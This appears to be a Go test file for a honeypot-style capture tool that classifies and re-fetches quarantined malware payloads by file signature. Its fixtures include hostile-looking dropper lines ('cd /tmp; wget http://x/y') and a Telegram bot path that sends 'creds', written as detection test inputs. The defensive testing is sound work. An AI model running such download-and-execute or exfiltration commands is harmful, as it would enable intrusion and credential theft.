package capture

import (
	"bytes"
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/store"
)

func TestPayloadShaped(t *testing.T) {
	tar := make([]byte, 512)
	copy(tar[257:], "ustar")
	cases := []struct {
		name string
		head []byte
		want bool
	}{
		{"elf", []byte("\x7fELF\x02\x01\x01rest"), true},
		{"pe", []byte("MZ\x90\x00"), true},
		{"zip", []byte("PK\x03\x04rest"), true},
		{"gzip", []byte("\x1f\x8b\x08\x00"), true},
		{"bzip2", []byte("BZh91AY"), true},
		{"xz", []byte("\xfd7zXZ\x00\x00"), true},
		{"7z", []byte("7z\xbc\xaf\x27\x1c\x00"), true},
		{"tar", tar, true},
		{"shebang script", []byte("#!/bin/sh\nwget http://x/y\n"), true},
		{"shebang then binary", append([]byte("#!/bin/sh\n"), bytes.Repeat([]byte{0}, 64)...), false},
		{"script without shebang", []byte("cd /tmp; wget http://x/y\n"), false},
		{"html", []byte("<!doctype html><html><body>hi</body></html>"), false},
		{"telegram json", []byte(`{"ok":true,"result":{"message_id":42,"date":1760000000}}`), false},
		{"ip echo", []byte("203.0.113.5\n"), false},
		{"empty", nil, false},
	}
	for _, c := range cases {
		if got := payloadShaped(c.head); got != c.want {
			t.Errorf("%s: payloadShaped=%v want %v", c.name, got, c.want)
		}
	}
	if refetchSeedable("http://198.51.100.1/bins/x?id=1", []byte("\x7fELF")) {
		t.Error("a URL with a query string must not be seeded")
	}
	if refetchSeedable("http://198.51.100.1/bins/x?", []byte("\x7fELF")) {
		t.Error("a URL with an empty query must not be seeded")
	}
	if !refetchSeedable("http://198.51.100.1/bins/x", []byte("\x7fELF")) {
		t.Error("a payload-shaped capture of a plain URL must be seeded")
	}
}

func (fx *refetchFixture) scheduleRows(t *testing.T) int {
	t.Helper()
	var n int
	fx.query(t, `SELECT COUNT(*) FROM refetch_schedule`, nil, &n)
	return n
}

// The ArtifactWorker seeds the re-fetch schedule only with capture.refetch on,
// for a query-less URL whose body is payload-shaped (I1, I3).
func TestArtifactWorkerSeedsOnlyPayloadShapedCaptures(t *testing.T) {
	cases := []struct {
		name, path, body string
		refetch, seeded  bool
	}{
		{"script, refetch on", "/bins/a.sh", "#!/bin/sh\necho a\n", true, true},
		{"elf, refetch on", "/bins/x86", "\x7fELF\x02\x01\x01" + strings.Repeat("\x00", 64), true, true},
		{"script, refetch off", "/bins/b.sh", "#!/bin/sh\necho b\n", false, false},
		{"query string", "/bot123/sendMessage?chat_id=1&text=creds", "#!/bin/sh\necho c\n", true, false},
		{"api json", "/api/ip", `{"ok":true,"ip":"203.0.113.5"}`, true, false},
		{"html", "/index.html", "<html><body>parked</body></html>", true, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			fx := newRefetchFixture(t)
			fx.set(c.body, 200)
			url := fx.srv.URL + c.path
			if err := fx.st.UpsertArtifact(store.Artifact{URL: url, TS: time.Now(), Origin: "quarantine_fetch", Status: "pending"}); err != nil {
				t.Fatal(err)
			}
			w := NewArtifactWorker(fx.st, fx.fetch, 5, time.Minute)
			w.Hosts = fx.hosts
			w.Refetch = c.refetch
			if err := w.tick(context.Background()); err != nil {
				t.Fatal(err)
			}
			var status string
			fx.query(t, `SELECT status FROM artifacts WHERE url=? AND fetch_epoch=0`, []any{url}, &status)
			if status != "fetched" {
				t.Fatalf("first capture status=%s", status)
			}
			if got := fx.scheduleRows(t) == 1; got != c.seeded {
				t.Fatalf("seeded=%v want %v", got, c.seeded)
			}
		})
	}
}

// A re-fetch whose body is no longer payload-shaped is a failed check: no
// epoch row, no evidence file (I3).
func TestRefetchWorkerRejectsNonPayloadBody(t *testing.T) {
	fx := newRefetchFixture(t)
	url := fx.srv.URL + "/bins/x.sh"
	fx.capture(t, url)
	fx.set("<html><body>account suspended</body></html>", 200)
	clock := time.Now().UTC().Add(61 * time.Minute)
	if err := fx.worker(&clock).tick(context.Background()); err != nil {
		t.Fatal(err)
	}
	if fx.count() != 2 {
		t.Fatalf("requests=%d want 2", fx.count())
	}
	if s := fx.schedule(t, url); s.failures != 1 || s.checks != 1 || s.leased {
		t.Fatalf("schedule after a non-payload body: %+v", s)
	}
	if n := fx.rowsFor(t, url); n != 1 {
		t.Fatalf("a non-payload body was recorded: rows=%d", n)
	}
	if n := fx.quarantineFiles(t); n != 1 {
		t.Fatalf("a non-payload body was kept as evidence: quarantine files=%d", n)
	}
}

// A server minting a new script on every check yields at most
// store.RefetchMaxNewPayloads new epochs, then the schedule is done (I3).
func TestRefetchWorkerStopsAfterNewPayloadCap(t *testing.T) {
	fx := newRefetchFixture(t)
	url := fx.srv.URL + "/bins/x.sh"
	fx.capture(t, url)
	clock := time.Now().UTC().Add(61 * time.Minute)
	w := fx.worker(&clock)
	for i := 1; i <= store.RefetchMaxNewPayloads+2; i++ {
		fx.set(fmt.Sprintf("#!/bin/sh\necho build-%d\n", i), 200)
		if err := w.tick(context.Background()); err != nil {
			t.Fatal(err)
		}
		clock = clock.Add(61 * time.Minute)
	}
	if n := fx.rowsFor(t, url); n != 1+store.RefetchMaxNewPayloads {
		t.Fatalf("rows=%d want %d", n, 1+store.RefetchMaxNewPayloads)
	}
	if s := fx.schedule(t, url); s.state != "done" {
		t.Fatalf("state=%s want done", s.state)
	}
	if fx.count() != 1+store.RefetchMaxNewPayloads {
		t.Fatalf("requests=%d: a capped URL was fetched again", fx.count())
	}
}
